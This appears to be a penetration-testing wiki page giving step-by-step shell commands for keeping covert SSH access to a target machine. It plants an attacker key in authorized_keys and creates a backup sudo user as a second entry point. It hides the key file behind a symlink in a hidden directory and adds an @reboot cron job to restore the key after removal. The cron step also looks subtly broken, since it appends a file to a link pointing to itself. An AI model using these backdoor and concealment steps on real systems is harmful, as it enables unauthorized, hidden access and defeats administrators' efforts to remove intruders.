---
legal-banner: true
---

### **Step 1. Generate SSH Keys**

1. Generate an SSH key pair on your local machine:
`ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistence_key`
	- `-t rsa`: Specifies the type of key to create (RSA).
	- `-b 4096`: Specifies the number of bits in the key.
	- `-f ~/.ssh/persistence_key`: Specifies the file in which to save the key.

### **Step 2. Copy the Public Key to the Target Machine**

1.  Copy the public key to the target machine using SSH:
    `ssh-copy-id -i ~/.ssh/persistence_key.pub user@target_machine`
2.  Alternatively, manually add the public key to the target machine `~/.ssh/authorized_keys` file:  
    `cat ~/.ssh/persistence_key.pub | ssh user@target_machine "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"`

### **Step 3. Ensure Proper Permissions**

On the target machine, ensure the `.ssh` directory and `authorized_keys` file have the correct permissions:

1.  Set the .ssh directory permissions to 700:  
    `chmod 700 ~/.ssh`
2.  Set the authorized_keys file permissions to 600:  
    `chmod 600 ~/.ssh/authorized_keys`

### **Step 4. Configure SSH for Key-Based Authentication**

Verify the SSH server configuration on the target machine to ensure key-based authentication is enabled. Edit /etc/ssh/sshd_config:  
`sudo nano /etc/ssh/sshd_config`

1.  Ensure the following lines are present and uncommented:  
    `PubkeyAuthentication yes`  
    `AuthorizedKeysFile .ssh/authorized_keys`
    
2.  Restart the SSH service to apply the changes:  
    `sudo systemctl restart sshd`
    
3.  Test SSH access using the private key:  
    `ssh -i ~/.ssh/persistence_key user@target_machine`
    

### **Step 5. Establish a Backup SSH User**

Create a new user on the target machine as a backup entry point:

1.  Add a new user:  
    `sudo adduser backupuser`
2.  Add the new user to the `sudo` group:  
    `sudo usermod -aG sudo backupuser`
3.  Add your public key to the new user `authorized_keys` file:  
    `ssh-copy-id -i ~/.ssh/persistence_key.pub backupuser@target_machine`

### **Step 6. Hide Your Presence**

Move the authorized_keys file to a hidden location and create a symbolic link:

1.  Create a hidden directory:  
    `mkdir -p ~/.config/.ssh`  
    
2.  Move the authorized_keys file:  
    `mv ~/.ssh/authorized_keys ~/.config/.ssh/authorized_keys`  
   
3.  Create a symbolic link:  
    `ln -s ~/.config/.ssh/authorized_keys ~/.ssh/authorized_keys`  


### **Step 7. Set Up a Cron Job for Persistence**

1.  Create a cron job to ensure your SSH key is re-added if removed:  
    `(crontab -l ; echo "@reboot sleep 60 && cat ~/.config/.ssh/authorized_keys >> ~/.ssh/authorized_keys") | crontab -`